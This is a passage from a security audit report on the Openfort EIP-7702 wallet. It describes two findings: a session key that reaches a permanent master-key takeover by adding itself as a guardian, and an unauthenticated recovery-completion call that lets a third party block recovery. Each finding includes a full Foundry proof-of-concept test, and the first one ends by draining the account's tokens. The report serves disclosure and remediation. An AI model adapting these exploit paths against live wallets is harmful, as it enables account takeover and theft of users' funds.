A session key granted broad execution permissions can indirectly perform privileged recovery actions by invoking the SocialRecoveryManager through the wallet’s `execute(...)` flow. Because guardian-management functions authorize solely based on `msg.sender == account`, any session key permitted to call arbitrary external contracts can add attacker-controlled guardians, start recovery, and ultimately rotate the master key. This escalation bypasses intended restrictions that prevent session keys from calling privileged wallet functions and results in a permanent account takeover. Spend limits do not mitigate the issue, as the exploit path relies on administrative, zero-value calls. Once the attacker becomes the new master key, they gain full control over configuration and assets.

##### Details

- Explanation: Session keys cannot directly call the wallet, but they can instruct the wallet to call external contracts. Guardian-management in the SocialRecoveryManager relies only on the caller being the wallet address. A session key with wildcard `canCall` permissions can trigger `proposeGuardian` and `confirmGuardianProposal` as the wallet, adding attacker guardians and enabling the attacker to initiate and complete recovery. Completing recovery replaces the master key with an attacker-controlled key.

- Root cause: Guardian-management and recovery actions validate only `msg.sender == account`, without requiring master-key authorization. The execution engine causes external calls to appear as wallet-originated, allowing session keys to pass this check.

- Code location:
  - Call validation: [OPF7702.sol#L394](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L394)
  - Guardian proposal: [SocialRecover.sol#L108](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L108)
  - Guardian confirmation: [SocialRecover.sol#L144](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L144)
  - Recovery completion: [OPF7702Recoverable.sol#L137](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702Recoverable.sol#L137)

- Vulnerable snippets:

```solidity
// OPF7702._validateCall
if (!_isCanCall(keyId, call.target, call.data)) {
    return false;
}
```

```solidity
// SocialRecoveryManager.proposeGuardian
if (msg.sender != _account) revert IOPF7702Recoverable.OPF7702Recoverable__Unauthorized();
```

```solidity
// SocialRecoveryManager.confirmGuardianProposal
if (msg.sender != _account) revert IOPF7702Recoverable.OPF7702Recoverable__Unauthorized();
```

```solidity
// OPF7702Recoverable.completeRecovery
_setNewMasterKey(recoveryOwner);
```

##### Impact

- Permanent replacement of the wallet’s master key  
- Full compromise of assets and configuration  
- Persistence of attacker control beyond session key expiration  

##### Steps to Reproduce 
1. Ensure Foundry is installed.
2. Set a Sepolia JSON-RPC endpoint (any working endpoint is fine):

```bash
export SEPOLIA_RPC_URL=https://ethereum-sepolia-rpc.publicnode.com
```

3. From the repository root, run the PoC test:

```bash
cd openfort-7702-account
forge test --match-path test/unit/POC_SessionKeyGuardianInjection_e6533b64.t.sol -vvv
```

4. Observe the test passes and asserts:
- Attacker becomes an active guardian via session-key-driven calls.
- Recovery completes after the session key is expired.
- The master key rotates to an attacker-chosen EOA.
- The attacker drains the account’s ERC-20 balance.

PoC source:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Deploy} from "./../Deploy.t.sol";
import {PackedUserOperation} from
    "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";
import {SocialRecoveryManager} from "src/utils/SocialRecover.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

/**
 * @title POC: Session key escalates to permanent master key via guardian injection
 * @notice Proof Statement: Prove that an attacker holding a valid EOA session key with broad canCall
 *         permission `(ANY_TARGET, ANY_FN_SEL)` can (1) add themselves as a guardian by calling
 *         `SocialRecoveryManager.proposeGuardian/confirmGuardianProposal` as the account via `execute(...)`,
 *         then (2) start and complete recovery to install themselves as the new master key; after which the
 *         same EOA can bypass its previously configured spend limit and drain the account.
 *
 * Bug Vector:
 * 1) Owner registers an EOA session key, configures a strict per-token spend limit, and grants full canCall.
 * 2) Session key submits AA userOps calling the recovery manager to add `attacker` as a guardian.
 * 3) Attacker (as an active guardian) starts recovery setting `attacker` as the new master key.
 * 4) After `RECOVERY_PERIOD`, attacker completes recovery with guardian signature(s) and becomes master key.
 * 5) Attacker drains ERC-20 balance beyond the preconfigured session-key spend limit.
 */
contract POC_SessionKeyGuardianInjection_e6533b64 is Deploy {
    function setUp() public override {
        super.setUp();
        _quickInitializeAccount();
        _initializeAccount();
    }

    function test_POC_SessionKeyGuardianInjectionToPermanentTakeover() external {
        address attacker = sessionKey;
        uint256 attackerPk = sessionKeyPK;
        (address newOwner, uint256 newOwnerPk) = makeAddrAndKey("attacker_newOwner");

        // --- Setup: fund account and configure a strictly-limited EOA session key.
        uint256 initialTokenBalance = 10e18;
        erc20.mint(owner, initialTokenBalance);

        KeyDataReg memory eoaSessionKeyReg = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: uint48(block.timestamp + 2 days),
            validAfter: 0,
            limits: 10,
            key: _getKeyEOA(attacker),
            keyControl: KeyControl.Self
        });
        bytes32 sessionKeyId = _computeKeyId(KeyType.EOA, _getKeyEOA(attacker));

        uint256 tokenSpendLimit = 1e18;
        Call[] memory setupCalls = new Call[](3);
        setupCalls[0] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(account.registerKey.selector, eoaSessionKeyReg)
        );
        setupCalls[1] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(
                account.setTokenSpend.selector,
                sessionKeyId,
                address(erc20),
                tokenSpendLimit,
                SpendPeriod.Month
            )
        );
        setupCalls[2] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(account.setCanCall.selector, sessionKeyId, ANY_TARGET, ANY_FN_SEL, true)
        );
        _relayUserOp(_userOpSignedByOwner(_packCallData(mode_1, setupCalls)));

        // --- Step 1/2: session key adds itself as a guardian via recovery manager (msg.sender == account).
        bytes32 attackerGuardianId = keccak256(abi.encodePacked(attacker));

        Call[] memory proposeCalls = new Call[](1);
        proposeCalls[0] = _createCall(
            address(recoveryManager),
            0,
            abi.encodeWithSelector(
                SocialRecoveryManager.proposeGuardian.selector, address(account), attackerGuardianId
            )
        );
        _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, proposeCalls), attackerPk));

        vm.warp(block.timestamp + SECURITY_PERIOD + 1);

        Call[] memory confirmCalls = new Call[](1);
        confirmCalls[0] = _createCall(
            address(recoveryManager),
            0,
            abi.encodeWithSelector(
                SocialRecoveryManager.confirmGuardianProposal.selector,
                address(account),
                attackerGuardianId
            )
        );
        _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, confirmCalls), attackerPk));

        assertTrue(
            recoveryManager.isGuardian(address(account), attackerGuardianId),
            "attacker guardian should be active"
        );

        // --- Step 3: attacker starts recovery to install itself as the new master key.
        KeyDataReg memory recoveryKey = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: type(uint48).max,
            validAfter: 0,
            limits: 0,
            key: _getKeyEOA(newOwner),
            keyControl: KeyControl.Self
        });

        vm.prank(attacker);
        recoveryManager.startRecovery(address(account), recoveryKey);

        // --- Step 4: after recoveryPeriod, complete recovery with attacker guardian signature (quorum can be 1).
        bytes32 digest = recoveryManager.getDigestToSign(address(account));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        bytes[] memory signatures = new bytes[](1);
        signatures[0] = abi.encodePacked(r, s, v);

        vm.warp(block.timestamp + RECOVERY_PERIOD + 1);
        assertTrue(block.timestamp > eoaSessionKeyReg.validUntil, "session key should be expired now");

        vm.prank(attacker);
        account.completeRecovery(signatures);

        // Assert takeover: attacker is now master key id 0.
        (bytes32 masterKeyId, KeyData memory masterKeyData) = account.keyAt(0);
        bytes32 newOwnerKeyId = _computeKeyId(KeyType.EOA, _getKeyEOA(newOwner));
        assertEq(masterKeyId, newOwnerKeyId, "master key id should rotate to attacker-chosen EOA");
        assertTrue(masterKeyData.masterKey, "new owner key should be master");
        assertEq(uint8(masterKeyData.keyType), uint8(KeyType.EOA), "master key type should be EOA");

        // --- Step 5: attacker drains full ERC-20 balance using the new master key.
        Call[] memory drainCalls = new Call[](1);
        drainCalls[0] = _createCall(
            address(erc20),
            0,
            abi.encodeWithSelector(IERC20.transfer.selector, attacker, initialTokenBalance)
        );
        _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, drainCalls), newOwnerPk));

        assertEq(IERC20(address(erc20)).balanceOf(attacker), initialTokenBalance);
        (, , uint256 spentAfter, ) = account.tokenSpend(sessionKeyId, address(erc20));
        assertEq(spentAfter, 0, "session key spend counter should remain unchanged (recovery bypasses it)");
    }

    function _relayUserOp(PackedUserOperation memory userOp) internal {
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = userOp;

        _etch();
        vm.prank(sender);
        entryPoint.handleOps(ops, payable(sender));
    }

    function _userOpSignedByOwner(bytes memory callData)
        internal
        view
        returns (PackedUserOperation memory userOp)
    {
        userOp = _getFreshUserOp();
        userOp = _populateUserOp(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        bytes memory signature = _signUserOp(userOp);
        userOp.signature = _encodeEOASignature(signature);
    }

    function _userOpSignedBySessionKey(bytes memory callData, uint256 pk)
        internal
        view
        returns (PackedUserOperation memory userOp)
    {
        userOp = _getFreshUserOp();
        userOp = _populateUserOp(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        bytes memory signature = _signUserOp(userOp, pk);
        userOp.signature = _encodeEOASignature(signature);
    }
}

```

##### Assumptions and Uncertainties

- The session key is configured with wildcard or sufficiently broad `canCall` permissions. If this is not true, the escalation path may not be reachable.  
- The attacker must maintain session-key access through the configured time delays.  
- Recovery quorum must be satisfiable by attacker-added guardians; if the quorum is larger than the number of attacker guardians, the attack may fail.

##### Why did tests miss this issue?

Tests assume only the master key initiates guardian-management actions and do not include adversarial cases where a session key with wildcard permissions calls into the recovery manager. No test explores session key interactions with guardian workflows.

##### Recommendation

- Require master-key authorization (e.g., via wallet-validated signatures) for guardian add/remove operations and recovery initiation.  
- Alternatively, block session keys from invoking the recovery manager unless explicitly granted a specialized recovery-admin permission.

##### References

1. [OPF7702.sol#L394](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L394)  
2. [SocialRecover.sol#L108](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L108)  
3. [SocialRecover.sol#L144](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L144)  
4. [OPF7702Recoverable.sol#L137](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702Recoverable.sol#L137)

<a id="low"></a>
## Low

<a id="finding-open-7"></a>
### OPEN-7 — Unauthenticated SocialRecoveryManager.completeRecovery enables third-party front-run to cancel and brick master-key recovery
✅ Valid
##### Summary

`SocialRecoveryManager.completeRecovery` performs irreversible state transitions—deleting `recoveryData[_account]` and clearing the account lock—without authenticating the caller. Because guardian signatures are not bound to `msg.sender`, any third party can reuse the same signatures intended for `OPF7702Recoverable.completeRecovery` and front‑run the account’s completion attempt in public orderflow. This causes the manager to clear recovery state before the account rotates keys, making the account’s subsequent completion call revert with “no ongoing recovery.” Guardians must restart the entire recovery process and wait through the timelock again. An attacker can repeat this indefinitely, preventing key rotation and undermining the reliability of social recovery, especially when the current master key is compromised.

##### Details

- Explanation:  
  Recovery completion involves two components: the account contract, which rotates keys, and the recovery manager, which verifies guardian signatures and clears recovery state. However, the manager’s `completeRecovery` lacks the `msg.sender == _account` authorization enforced in other manager functions. As a result, a third party who observes valid guardian signatures (e.g., from a pending public transaction) can call the manager directly, clearing recovery state before the account performs key rotation.

- Root cause:  
  Missing caller authentication on `SocialRecoveryManager.completeRecovery`, despite its authority to mutate critical recovery state.

- Code location:  
  `SocialRecover.sol`, lines around the manager’s `completeRecovery`  
  `OPF7702Recoverable.sol`, lines where the account calls the manager during completion

- Brief code snippets:

```solidity
function completeRecovery(address _account, bytes[] calldata _signatures)
    external
    override
    returns (IKey.KeyDataReg memory recoveryOwner)
{
    _requireRecovery(_account, true);

    IOPF7702Recoverable.RecoveryData memory r = recoveryData[_account];

    if (r.executeAfter > block.timestamp) {
        revert IOPF7702Recoverable.OPF7702Recoverable__OngoingRecovery();
    }

    if (r.guardiansRequired != _signatures.length) {
        revert IOPF7702Recoverable.OPF7702Recoverable__InvalidSignatureAmount();
    }

    if (!_validateSignatures(_account, _signatures)) {
        revert IOPF7702Recoverable.OPF7702Recoverable__InvalidRecoverySignatures();
    }

    recoveryOwner = r.key;

    delete recoveryData[_account];
    emit IOPF7702Recoverable.RecoveryCompleted();
    _setLock(_account, 0);
}
```

```solidity
function completeRecovery(bytes[] calldata _signatures) external virtual {
    KeyDataReg memory recoveryOwner =
        ISocialRecoveryManager(RECOVERY_MANAGER).completeRecovery(address(this), _signatures);

    _deleteOldKeys();
    _setNewMasterKey(recoveryOwner);
}
```

##### Impact

- Any untrusted third party can finalize recovery on the manager without rotating keys.  
- The account’s legitimate recovery completion always reverts, blocking master‑key rotation.  
- Recovery becomes unreliable in public mempools, enabling attackers to indefinitely prevent compromised‑key replacement.  
- Operationally, guardians must restart recovery and endure full timelocks repeatedly.

##### Steps to Reproduce

1) Add the following PoC test file:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "lib/forge-std/src/Test.sol";

import {IKey} from "src/interfaces/IKey.sol";
import {IOPF7702Recoverable} from "src/interfaces/IOPF7702Recoverable.sol";
import {OPFMain} from "src/core/OPFMain.sol";
import {GasPolicy} from "src/utils/GasPolicy.sol";
import {EntryPoint} from "lib/account-abstraction/contracts/core/EntryPoint.sol";
import {WebAuthnVerifierV2} from "src/utils/WebAuthnVerifierV2.sol";
import {SocialRecoveryManager} from "src/utils/SocialRecover.sol";

/**
 * @title POC: Unauthenticated `SocialRecoveryManager.completeRecovery` Enables Third-Party Front-Run DoS
 * @notice Proof Statement: Prove that any third party can call `SocialRecoveryManager.completeRecovery(account, sigs)`
 *         with valid guardian signatures, deleting `recoveryData[account]` and clearing the lock without rotating the
 *         account master key. After this, `account.completeRecovery(sigs)` reverts with `NoOngoingRecovery`, meaning
 *         a mempool observer can front-run a legitimate completion attempt and indefinitely prevent recovery.
 *
 * Bug Vector:
 * 1) A guardian starts recovery, setting `recoveryData[account]` and `executeAfter`.
 * 2) After `executeAfter`, a third party reuses the guardian signature(s) to call the recovery manager directly.
 * 3) Observe the recovery manager deletes `recoveryData[account]` but the account master key remains unchanged.
 * 4) Observe `account.completeRecovery(sigs)` now reverts (`NoOngoingRecovery`) because the manager already deleted
 *    the recovery state.
 */
contract POC_UnauthCompleteRecoveryFrontRunBricksRecovery_be59515a is Test, IKey {
    function test_POC_UnauthenticatedCompleteRecoveryBricksAccountCompletion() external {
        // Deploy real dependencies locally (no forks / no mocks).
        EntryPoint entryPoint = new EntryPoint();
        WebAuthnVerifierV2 webAuthn = new WebAuthnVerifierV2();
        GasPolicy gasPolicy = new GasPolicy(110_000, 360_000, 240_000, 60_000, 60_000);
        SocialRecoveryManager recoveryManager =
            new SocialRecoveryManager(2 days, 5 days, 1.5 days, 0.5 days);
        OPFMain implementation = new OPFMain(
            address(entryPoint), address(webAuthn), address(gasPolicy), address(recoveryManager)
        );

        // EIP-7702 "setCode" simulation: the account lives at an EOA address.
        (address owner, uint256 ownerPk) = makeAddrAndKey("owner");
        vm.etch(owner, abi.encodePacked(bytes3(0xef0100), address(implementation)));
        OPFMain account = OPFMain(payable(owner));

        // Initialize with an EOA master key.
        KeyDataReg memory mkReg = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: type(uint48).max,
            validAfter: 0,
            limits: 0,
            key: abi.encode(owner),
            keyControl: KeyControl.Self
        });
        KeyDataReg memory skReg = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: 0,
            validAfter: 0,
            limits: 0,
            key: "",
            keyControl: KeyControl.Self
        });

        (address guardian, uint256 guardianPk) = makeAddrAndKey("guardian");
        bytes32 initialGuardian = keccak256(abi.encodePacked(guardian));
        bytes32 initDigest = account.getDigestToInit(mkReg, skReg, initialGuardian);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, initDigest);
        bytes memory initSig = abi.encodePacked(r, s, v);

        vm.prank(owner);
        account.initialize(mkReg, skReg, initSig, initialGuardian);

        // Guarding invariant: master key is initially `owner`.
        (, IKey.KeyData memory mkBefore) = account.keyAt(0);
        assertEq(uint8(mkBefore.keyType), uint8(KeyType.EOA), "setup: master key type");
        assertEq(mkBefore.key, abi.encode(owner), "setup: master key bytes");

        // Guardian starts recovery to rotate master key to `newMaster`.
        KeyDataReg memory recoveryKey = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: type(uint48).max,
            validAfter: 0,
            limits: 0,
            key: abi.encode(makeAddr("newMaster")),
            keyControl: KeyControl.Self
        });

        vm.prank(guardian);
        recoveryManager.startRecovery(address(account), recoveryKey);

        assertTrue(recoveryManager.isLocked(address(account)), "setup: wallet should be locked");
        (, uint64 executeAfter, uint32 quorum) = recoveryManager.recoveryData(address(account));
        assertTrue(executeAfter != 0, "setup: recovery should be active");
        assertEq(quorum, 1, "setup: single guardian quorum");

        // Time travel to after the timelock and collect the guardian signature.
        vm.warp(uint256(executeAfter) + 1);
        bytes32 digest = recoveryManager.getDigestToSign(address(account));
        (v, r, s) = vm.sign(guardianPk, digest);
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = abi.encodePacked(r, s, v);

        // Attacker front-runs by calling the recovery manager directly with the same guardian signature.
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        recoveryManager.completeRecovery(address(account), sigs);

        // Vulnerability: recovery state cleared and lock lifted, but master key not rotated.
        assertFalse(recoveryManager.isLocked(address(account)), "vuln: lock cleared without key rotation");
        (, uint64 executeAfterAfter, uint32 quorumAfter) = recoveryManager.recoveryData(address(account));
        assertEq(executeAfterAfter, 0, "vuln: recoveryData deleted");
        assertEq(quorumAfter, 0, "vuln: recoveryData deleted");

        (, IKey.KeyData memory mkAfter) = account.keyAt(0);
        assertEq(uint8(mkAfter.keyType), uint8(KeyType.EOA), "vuln: master key type unchanged");
        assertEq(mkAfter.key, abi.encode(owner), "vuln: master key unchanged");

        // The legitimate completion call is now bricked (reverts) because the manager deleted recovery state first.
        vm.expectRevert(IOPF7702Recoverable.OPF7702Recoverable__NoOngoingRecovery.selector);
        vm.prank(attacker);
        account.completeRecovery(sigs);
    }
}
```

2) Run:

```bash
forge test --match-path test/by-contract/POC_UnauthCompleteRecoveryFrontRunBricksRecovery_be59515a.t.sol -vv
```

##### Assumptions and Uncertainties

- Assumes guardian signatures are publicly visible, such as in a public mempool or user operation.  
- Assumes the intended design requires the account to mediate finalization.  
- If the protocol intended manager‑direct completion to be permissionless, the absence of safeguards permitting atomic key rotation remains inconsistent with other manager methods.  
- If recoveries are always executed via private relays, exploitability decreases but the underlying authorization gap persists.

##### Why did tests miss this issue?

Tests exercised only the intended flow—account‑mediated completion—and did not include adversarial scenarios where a third party directly calls the recovery manager before the account, thereby consuming recovery state and preventing key rotation.

##### Recommendation

- Add an authorization check ensuring `SocialRecoveryManager.completeRecovery` may only be invoked by the target account.  
- Alternatively, redesign the recovery flow so that recovery‑state deletion and key rotation occur atomically and cannot be split across two calls accessible to different callers.

##### References

1. [SocialRecover.sol#L331](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L331)  
2. [SocialRecover.sol#L370](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L370)  
3. [OPF7702Recoverable.sol#L137](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702Recoverable.sol#L137)
